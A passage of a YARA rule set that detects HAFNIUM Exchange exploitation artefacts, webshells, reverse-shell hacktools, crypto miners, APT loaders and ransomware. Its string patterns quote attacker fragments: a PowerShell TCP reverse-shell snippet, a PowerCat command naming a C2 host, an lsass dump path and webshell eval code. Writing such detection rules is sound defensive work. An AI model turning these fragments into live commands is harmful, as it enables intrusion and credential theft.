  author = \"Florian Roth\"\n      reference = \"https://www.praetorian.com/blog/reproducing-proxylogon-exploit/\"\n      date = \"2021-03-10 18:55:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2021_27065, DEMO, G0125, LOG\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $sr1 = /GET \\/rpc\\/ &CorrelationID=<empty>;&RequestId=[^\\n]{40,600} (200|301|302)/ \n   condition: \n      $sr1\n}\n\nrule LOG_Exchange_Forensic_Artefacts_CleanUp_Activity_Mar21_1_RID3C2E : DEMO G0125 LOG {\n   meta:\n      description = \"Detects forensic artefacts showing cleanup activity found in HAFNIUM intrusions exploiting\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/jdferrell3/status/1368626281970024448\"\n      date = \"2021-03-08 21:00:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, G0125, LOG\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /c cd /d C:/inetpub/wwwroot/aspnet_client\" ascii wide\n      $x2 = \"cmd.exe /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\" ascii wide\n      $s1 = \"aspnet_client&del '\" \n      $s2 = \"aspnet_client&attrib +h +s +r \" \n      $s3 = \"&echo [S]\" \n   condition: \n      1 of ( $x* ) or 2 of them\n}\n\nrule APT_HAFNIUM_ForensicArtefacts_WER_Mar21_1_RID3551 : APT CVE_2021_26857 DEMO FILE G0125 {\n   meta:\n      description = \"Detects a Windows Error Report (WER) that indicates and exploitation attempt of the Exchange server as described in CVE-2021-26857 after the corresponding patches have been applied. WER files won't be written upon successful exploitation before applying the patch. Therefore, this indicates an unsuccessful attempt.\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1368471533048446976\"\n      date = \"2021-03-07 16:08:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CVE_2021_26857, DEMO, FILE, G0125\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"AppPath=c:\\\\windows\\\\system32\\\\inetsrv\\\\w3wp.exe\" wide fullword\n      $s7 = \".Value=w3wp#MSExchangeECPAppPool\" wide\n   condition: \n      uint16 ( 0 ) == 0xfeff and filesize < 8KB and all of them\n}\n\nrule APT_MAL_ASPX_HAFNIUM_Chopper_Mar21_4_RID32D6 : APT DEMO G0125 MAL T1505_003 {\n   meta:\n      description = \"Detects HAFNIUM ASPX files dropped on compromised servers\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\"\n      date = \"2021-03-07 14:22:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0125, MAL, T1505_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<%@Page Language=\\\"Jscript\\\"%>\" ascii wide nocase\n      $s2 = \".FromBase64String(\" ascii wide nocase\n      $s3 = \"eval(System.Text.Encoding.\" ascii wide nocase\n   condition: \n      filesize < 850 and all of them\n}\n\nrule WEBSHELL_ASP_Embedded_Mar21_1_RID3085 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects ASP webshells\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2021-03-05 12:43:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<script runat=\\\"server\\\">\" nocase\n      $s2 = \"new System.IO.StreamWriter(Request.Form[\" \n      $s3 = \".Write(Request.Form[\" \n   condition: \n      filesize < 100KB and all of them\n}\n\nrule APT_WEBSHELL_HAFNIUM_SecChecker_Mar21_1_RID33B3 : APT DEMO G0125 T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects HAFNIUM SecChecker webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/markus_neis/status/1367794681237667840\"\n      date = \"2021-03-05 14:59:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0\"\n      tags = \"APT, DEMO, G0125, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<%if(System.IO.File.Exists(\\\"c:\\\\\\\\program files (x86)\\\\\\\\fireeye\\\\\\\\xagt.exe\" ascii\n      $x2 = \"\\\\csfalconservice.exe\\\")){Response.Write( \\\"3\\\");}%></head>\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 1KB and 1 of them or 2 of them\n}\n\nrule APT_MAL_ASP_DLL_HAFNIUM_Mar21_1_RID3086 : APT DEMO EXE FILE G0125 MAL {\n   meta:\n      description = \"Detects HAFNIUM compiled ASP.NET DLLs dropped on compromised servers\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\"\n      date = \"2021-03-05 12:43:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"097f5f700c000a13b91855beb61a931d34fb0abb738a110368f525e25c5bc738\"\n      hash2 = \"15744e767cbaa9b37ff7bb5c036dda9b653fc54fc9a96fe73fbd639150b3daa3\"\n      hash3 = \"52ae4de2e3f0ef7fe27c699cb60d41129a3acd4a62be60accc85d88c296e1ddb\"\n      tags = \"APT, DEMO, EXE, FILE, G0125, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Page_Load\" ascii fullword\n      $sc1 = { 20 00 3A 00 20 00 68 00 74 00 74 00 70 00 3A 00\n               2F 00 2F 00 (66|67) 00 2F 00 00 89 A3 0D 00 0A 00 } \n      $op1 = { 00 43 00 58 00 77 00 30 00 4a 00 45 00 00 51 7e 00 2f } \n      $op2 = { 58 00 77 00 30 00 4a 00 45 00 00 51 7e 00 2f 00 61 00 } \n      $op3 = { 01 0e 0e 05 20 01 01 11 79 04 07 01 12 2d 04 07 01 12 31 02 } \n      $op4 = { 5e 00 03 00 bc 22 00 00 00 00 01 00 85 03 2b 00 03 00 cc } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of ( $s* ) or all of ( $op* )\n}\n\nrule HKTL_Nishang_PS1_Invoke_PowerShellTcpOneLine_RID379E : DEMO HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects PowerShell Oneliner in Nishang's repository\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1\"\n      date = \"2021-03-03 17:46:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"=([text.encoding]::ASCII).GetBytes((iex $\" ascii wide\n      $s2 = \".GetStream();[byte[]]$\" ascii wide\n      $s3 = \"New-Object Net.Sockets.TCPClient('\" ascii wide\n   condition: \n      all of them\n}\n\nrule EXPL_LOG_CVE_2021_26858_Exchange_Forensic_Artefacts_Mar21_1_RID3AE0 : CVE_2021_26858 DEMO EXPLOIT G0125 LOG {\n   meta:\n      description = \"Detects forensic artefacts found in HAFNIUM intrusions exploiting CVE-2021-26858\"\n      author = \"Florian Roth\"\n      reference = \"https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/\"\n      date = \"2021-03-02 20:05:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-03-04\"\n      tags = \"CVE_2021_26858, DEMO, EXPLOIT, G0125, LOG\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $xr1 = /POST (\\/owa\\/auth\\/Current\\/themes\\/resources\\/logon\\.css|\\/owa\\/auth\\/Current\\/themes\\/resources\\/owafont_ja\\.css|\\/owa\\/auth\\/Current\\/themes\\/resources\\/lgnbotl\\.gif|\\/owa\\/auth\\/Current\\/themes\\/resources\\/owafont_ko\\.css|\\/owa\\/auth\\/Current\\/themes\\/resources\\/SegoeUI-SemiBold\\.eot|\\/owa\\/auth\\/Current\\/themes\\/resources\\/SegoeUI-SemiLight\\.ttf|\\/owa\\/auth\\/Current\\/themes\\/resources\\/lgnbotl\\.gif)/ \n   condition: \n      $xr1\n}\n\nrule EXPL_CVE_2021_27065_Exchange_Forensic_Artefacts_Mar21_1_RID3996 : CVE_2021_27065 DEMO EXPLOIT G0125 SCRIPT {\n   meta:\n      description = \"Detects forensic artefacts found in HAFNIUM intrusions exploiting CVE-2021-27065\"\n      author = \"Florian Roth\"\n      reference = \"https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/\"\n      date = \"2021-03-02 19:10:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-12-01\"\n      tags = \"CVE_2021_27065, DEMO, EXPLOIT, G0125, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"S:CMD=Set-OabVirtualDirectory.ExternalUrl='\" ascii wide fullword\n   condition: \n      1 of them\n}\n\nrule APT_HAFNIUM_Forensic_Artefacts_Mar21_1_RID3463 : APT DEMO G0125 {\n   meta:\n      description = \"Detects forensic artefacts found in HAFNIUM intrusions\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\"\n      date = \"2021-03-02 15:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0125\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"lsass.exe C:\\\\windows\\\\temp\\\\lsass\" ascii wide fullword\n      $s2 = \"c:\\\\ProgramData\\\\it.zip\" ascii wide fullword\n      $s3 = \"powercat.ps1'); powercat -c\" ascii wide fullword\n   condition: \n      1 of them\n}\n\nrule HKTL_PS1_PowerCat_Mar21_RID2EDD : DEMO HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects PowerCat hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/besimorhino/powercat\"\n      date = \"2021-03-02 11:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com\" ascii fullword\n      $x2 = \"try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}\" ascii fullword\n      $s1 = \"Returning Encoded Payload...\" ascii\n      $s2 = \"$CommandToExecute =\" ascii fullword\n      $s3 = \"[alias(\\\"Execute\\\")][string]$e=\\\"\\\",\" ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 200KB and 1 of ( $x* ) or 3 of them\n}\n\nrule WEBSHELL_PHP_DEWMODE_UNC2546_Feb21_1_RID3187 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects DEWMODE webshells\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html\"\n      date = \"2021-02-22 13:26:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7\"\n      hash2 = \"5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<font size=4>Cleanup Shell</font></a>';\" ascii fullword\n      $x2 = \"$(sh /tmp/.scr)\" \n      $x3 = \"@system('sudo /usr/local/bin/admin.pl --mount_cifs=\" ascii\n      $s1 = \"target=\\\\\\\"_blank\\\\\\\">Download</a></td>\\\";\" ascii\n      $s2 = \",PASSWORD 1>/dev/null 2>/dev/null');\" ascii\n      $s3 = \",base64_decode('\" ascii\n      $s4 = \"include \\\"remote.inc\\\";\" ascii\n      $s5 = \"@system('sudo /usr/local\" ascii\n   condition: \n      uint16 ( 0 ) == 0x3f3c and filesize < 9KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them\n}\n\nrule SUSP_VEST_Encryption_Core_Accumulator_Jan21_RID3729 : DEMO EXE FILE G0032 NK SUSP {\n   meta:\n      description = \"Detects VEST encryption core accumulator in PE file as used by Lazarus malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ochsenmeier/status/1354737155495649280\"\n      date = \"2021-01-28 17:26:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7cd3ca8bdfb44e98a4b9d0c6ad77546e03d169bda9bdf3d1bcf339f68137af23\"\n      tags = \"DEMO, EXE, FILE, G0032, NK, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sc1 = { 4F 70 46 DA E1 8D F6 41 59 E8 5D 26 1E CC 2F 89\n               26 6D 52 BA BC 11 6B A9 C6 47 E4 9C 1E B6 65 A2\n               B6 CD 90 47 1C DF F8 10 4B D2 7C C4 72 25 C6 97\n               25 5D C6 1D 4B 36 BC 38 36 33 F8 89 B4 4C 65 A7\n               96 CA 1B 63 C3 4B 6A 63 DC 85 4C 57 EE 2A 05 C7\n               0C E7 39 35 8A C1 BF 13 D9 52 51 3D 2E 41 F5 72\n               85 23 FE A1 AA 53 61 3B 25 5F 62 B4 36 EE 2A 51\n               AF 18 8E 9A C6 CF C4 07 4A 9B 25 9B 76 62 0E 3E\n               96 3A A7 64 23 6B B6 19 BC 2D 40 D7 36 3E E2 85\n               9A D1 22 9F BC 30 15 9F C2 5D F1 23 E6 3A 73 C0 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and 1 of them\n}\n\nrule PUA_WIN_XMRIG_CryptoCoin_Miner_Dec20_RID33BA : DEMO EXE MAL {\n   meta:\n      description = \"Detects XMRIG crypto coin miners\"\n      author = \"Florian Roth\"\n      reference = \"https://www.intezer.com/blog/research/new-golang-worm-drops-xmrig-miner-on-servers/\"\n      date = \"2020-12-31 15:00:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b6154d25b3aa3098f2cee790f5de5a727fc3549865a7aa2196579fe39a86de09\"\n      tags = \"DEMO, EXE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"xmrig.exe\" fullword wide\n      $x2 = \"xmrig.com\" fullword wide\n      $x3 = \"* for x86, CRYPTOGAMS\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and 2 of them or all of them\n}\n\nrule SUSP_LNX_SH_CryptoMiner_Indicators_Dec20_1_RID364E : DEMO LINUX SCRIPT SUSP {\n   meta:\n      description = \"Detects helper script used in a crypto miner campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.intezer.com/blog/research/new-golang-worm-drops-xmrig-miner-on-servers/\"\n      date = \"2020-12-31 16:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3298dbd985c341d57e3219e80839ec5028585d0b0a737c994363443f4439d7a5\"\n      tags = \"DEMO, LINUX, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"miner running\" fullword ascii\n      $x2 = \"miner runing\" fullword ascii\n      $x3 = \" --donate-level 1 \" \n      $x4 = \" -o pool.minexmr.com:5555 \" ascii\n   condition: \n      filesize < 20KB and 1 of them\n}\n\nrule SUSP_AdobePDF_SFX_Bitmap_Combo_Executable_RID362C : ANOMALY DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a suspicious executable that contains both a SFX icon and an Adobe PDF icon\"\n      author = \"Florian Roth\"\n      reference = \"https://mp.weixin.qq.com/s/3Pa3hiuZyQBspDzH0kGSHw\"\n      date = \"2020-11-02 16:44:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"13655f536fac31e6c2eaa9e6e113ada2a0b5e2b50a93b6bbfc0aaadd670cde9b\"\n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $sc1 = { FF 00 CC FF FF 00 99 FF FF 00 66 FF FF 00 33 FF\n               FF 80 00 FF FF 80 FF CC FF 80 CC CC FF C0 99 CC\n               FF 80 66 CC FF 00 33 CC FF 00 00 CC FF 00 FF 99\n               FF FF CC 99 FF FF 99 99 FF FF 66 99 FF FF 33 99\n               FF 08 00 99 FF 88 FF 66 FF 88 CC 66 FF 88 99 66\n               FF 88 66 66 FF 88 33 66 FF 05 00 66 FF 55 FF 33\n               FF 55 CC 33 FF 55 99 33 FF 55 66 33 FF 58 33 33\n               FF 01 00 33 FF 99 FF 00 FF 99 CC 00 FF 99 99 00\n               FF 99 66 00 FF 58 33 00 FF 01 00 00 FF 99 FF FF\n               CC 99 CC FF CC 99 99 FF CC 99 66 FF CC 58 33 FF\n               CC 01 00 FF CC FF FF CC CC FF CC CC CC FF 99 CC\n               CC FF 66 CC CC 58 33 CC CC 01 00 CC CC FF FF 99 } \n      $sc2 = { 28 66 27 00 60 00 00 00 80 00 00 00 80 80 80 00\n               C0 C0 C0 00 FF FF FF 00 FF FF FF 00 FF FF FF 00\n               FF FF FF 00 FF FF FF 00 FF FF FF 00 FF FF FF 00\n               FF FF FF 00 FF FF FF 00 5D 33 00 00 5D 33 00 00\n               5D 33 00 00 5D 33 00 00 5D 33 00 00 5D 33 00 00\n               5D 33 00 00 5D 33 00 00 5D 33 00 00 5D 33 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them and pe.number_of_signatures < 1\n}\n\nrule SUSP_AdobePDF_Bitmap_Executable_RID328D : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a suspicious executable that contains a Adobe PDF icon and no shows no sign of actual Adobe software\"\n      author = \"Florian Roth\"\n      reference = \"https://mp.weixin.qq.com/s/3Pa3hiuZyQBspDzH0kGSHw\"\n      date = \"2020-11-02 14:10:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"13655f536fac31e6c2eaa9e6e113ada2a0b5e2b50a93b6bbfc0aaadd670cde9b\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $sc1 = { FF 00 CC FF FF 00 99 FF FF 00 66 FF FF 00 33 FF\n               FF 80 00 FF FF 80 FF CC FF 80 CC CC FF C0 99 CC\n               FF 80 66 CC FF 00 33 CC FF 00 00 CC FF 00 FF 99\n               FF FF CC 99 FF FF 99 99 FF FF 66 99 FF FF 33 99\n               FF 08 00 99 FF 88 FF 66 FF 88 CC 66 FF 88 99 66\n               FF 88 66 66 FF 88 33 66 FF 05 00 66 FF 55 FF 33\n               FF 55 CC 33 FF 55 99 33 FF 55 66 33 FF 58 33 33\n               FF 01 00 33 FF 99 FF 00 FF 99 CC 00 FF 99 99 00\n               FF 99 66 00 FF 58 33 00 FF 01 00 00 FF 99 FF FF\n               CC 99 CC FF CC 99 99 FF CC 99 66 FF CC 58 33 FF\n               CC 01 00 FF CC FF FF CC CC FF CC CC CC FF 99 CC\n               CC FF 66 CC CC 58 33 CC CC 01 00 CC CC FF FF 99 } \n      $fp1 = \"Adobe\" ascii wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $sc1 and not 1 of ( $fp* ) and pe.number_of_signatures < 1\n}\n\nrule APT_CN_MAL_RedDelta_Shellcode_Loader_Oct20_2_RID36A3 : APT CHINA DEMO EXE G0129 MAL {\n   meta:\n      description = \"Detects Red Delta samples\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/JAMESWT_MHT/status/1316387482708119556\"\n      date = \"2020-10-14 17:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"260ebbf392498d00d767a5c5ba695e1a124057c1c01fff2ae76db7853fe4255b\"\n      hash2 = \"9ccb4ed133be5c9c554027347ad8b722f0b4c3f14bfd947edfe75a015bf085e5\"\n      hash3 = \"b3fd750484fca838813e814db7d6491fea36abe889787fb7cf3fb29d9d9f5429\"\n      tags = \"APT, CHINA, DEMO, EXE, G0129, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\CLRLoader.exe\" wide fullword\n      $x2 = \"/callback.php?token=%s&computername=%s&username=%s\" ascii fullword\n      $s1 = \"DotNetLoader.Program\" wide fullword\n      $s2 = \"/download.php?api=40\" ascii fullword\n      $s3 = \"get %d URLDir\" ascii fullword\n      $s4 = \"Read code failed\" ascii fullword\n      $s5 = \"OpenFile fail!\" wide fullword\n      $s6 = \"Writefile success\" wide fullword\n      $op1 = { 4c 8d 45 e0 49 8b cc 41 8d 51 c3 e8 34 77 02 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $x* ) or 4 of them\n}\n\nrule APT_CN_MAL_RedDelta_Shellcode_Loader_Oct20_3_RID36A4 : APT CHINA DEMO EXE FILE G0129 MAL {\n   meta:\n      description = \"Detects Red Delta samples\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/JAMESWT_MHT/status/1316387482708119556\"\n      date = \"2020-10-14 17:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"740992d40b84b10aa9640214a4a490e989ea7b869cea27dbbdef544bb33b1048\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0129, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Taskschd.dll\" ascii fullword\n      $s2 = \"AddTaskPlanDllVerson.dll\" ascii fullword\n      $s3 = \"\\\\FlashUpdate.exe\" ascii\n      $s4 = \"D:\\\\Project\\\\FBIRedTeam\" ascii fullword\n      $s5 = \"Error %s:%d, ErrorCode: %x\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 4 of them\n}\n\nrule MAL_RANSOM_REvil_Oct20_1_RID2ED2 : CRIME DEMO EXE MAL RANSOM {\n   meta:\n      description = \"Detects REvil ransomware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2020-10-13 11:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5966c25dc1abcec9d8603b97919db57aac019e5358ee413957927d3c1790b7f4\"\n      hash2 = \"f66027faea8c9e0ff29a31641e186cbed7073b52b43933ba36d61e8f6bce1ab5\"\n      hash3 = \"f6857748c050655fb3c2192b52a3b0915f3f3708cd0a59bbf641d7dd722a804d\"\n      tags = \"CRIME, DEMO, EXE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 0f 8c 74 ff ff ff 33 c0 5f 5e 5b 8b e5 5d c3 8b } \n      $op2 = { 8d 85 68 ff ff ff 50 e8 2a fe ff ff 8d 85 68 ff } \n      $op3 = { 89 4d f4 8b 4e 0c 33 4e 34 33 4e 5c 33 8e 84 } \n      $op4 = { 8d 85 68 ff ff ff 50 e8 05 06 00 00 8d 85 68 ff } \n      $op5 = { 8d 85 68 ff ff ff 56 57 ff 75 0c 50 e8 2f } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them or 4 of them\n}\n\nrule APT_MAL_MalDoc_CloudAtlas_Oct20_1_RID3280 : APT DEMO FILE G0100 MAL {\n   meta:\n      description = \"Detects unknown maldoc dropper noticed in October 2020\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/jfslowik/status/1316050637092651009\"\n      date = \"2020-10-13 14:07:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7ba76b2311736dbcd4f2817c40dae78f223366f2404571cd16d6676c7a640d70\"\n      tags = \"APT, DEMO, FILE, G0100, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"https://msofficeupdate.org\" wide\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 300KB and 1 of ( $x* )\n}\n\nrule APT_MAL_URL_CloudAtlas_Oct20_2_RID3144 : APT DEMO FILE G0100 MAL {\n   meta:\n      description = \"Detects unknown maldoc dropper noticed in October 2020\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/jfslowik/status/1316050637092651009\"\n      date = \"2020-10-13 13:15:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a6a58b614a9f5ffa1d90b5d42e15521f52e2295f02c1c0e5cd9cbfe933303bee\"\n      tags = \"APT, DEMO, FILE, G0100, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $hc1 = { 5B 49 6E 74 65 72 6E 65 74 53 68 6F 72 74 63 75\n               74 5D 0D 0A 55 52 4C 3D 68 74 74 70 73 3A 2F 2F\n               6D 73 6F 66 66 69 63 65 75 70 64 61 74 65 2E 6F\n               72 67 } \n   condition: \n      uint16 ( 0 ) == 0x495b and filesize < 200 and $hc1 at 0\n}\n\nrule MAL_DOC_ZLoader_Oct20_1_RID2EA7 : DEMO FILE MAL {\n   meta:\n      description = \"Detects weaponized ZLoader documents\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/JohnLaTwC/status/1314602421977452544\"\n      date = \"2020-10-10 11:23:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"668ca7ede54664360b0a44d5e19e76beb92c19659a8dec0e7085d05528df42b5\"\n      hash2 = \"a2ffabbb1b5a124f462a51fee41221081345ec084d768ffe1b1ef72d555eb0a0\"\n      hash3 = \"d268af19db475893a3d19f76be30bb063ab2ca188d1b5a70e51d260105b201da\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sc1 = { 78 4E FC 04 AB 6B 17 E2 33 E3 49 62 50 69 BB 60\n               31 00 1E 00 02 4B BA E2 D8 E3 92 22 1E 69 96 20\n               98 } \n      $sc2 = { 6B 9E E2 36 E3 69 62 72 69 3A 60 55 6E } \n      $sc3 = { 3E 69 76 60 59 6E 34 FB 87 6B 75 } \n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 40KB and filesize > 30KB and all of them\n}\n\nrule APT_MAL_NK_Lazarus_VHD_Ransomware_Oct20_1_RID359E : APT CRIME DEMO EXE FILE G0032 MAL NK RANSOM {\n   meta:\n      description = \"Detects Lazarus VHD Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/\"\n      date = \"2020-10-05 16:20:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"52888b5f881f4941ae7a8f4d84de27fc502413861f96ee58ee560c09c11880d6\"\n      hash2 = \"5e78475d10418c6938723f6cfefb89d5e9de61e45ecf374bb435c1c99dd4a473\"\n      hash3 = \"6cb9afff8166976bd62bb29b12ed617784d6e74b110afcf8955477573594f306\"\n      tags = \"APT, CRIME, DEMO, EXE, FILE, G0032, MAL, NK, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HowToDecrypt.txt\" wide fullword\n      $s2 = \"rsa.cpp\" wide fullword\n      $s3 = \"sc stop \\\"Microsoft Exchange Compliance Service\\\"\" ascii fullword\n      $op1 = { 8b 8d bc fc ff ff 8b 94 bd 34 03 00 00 33 c0 50 } \n      $op2 = { 8b 8d 98 f9 ff ff 8d 64 24 00 8b 39 3b bc 85 34 } \n      $op3 = { 8b 94 85 34 03 00 00 89 11 40 83 c1 04 3b 06 7c } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them\n}\n\nrule APT_MAL_NK_Lazarus_VHD_Ransomware_Oct20_2_RID359F : 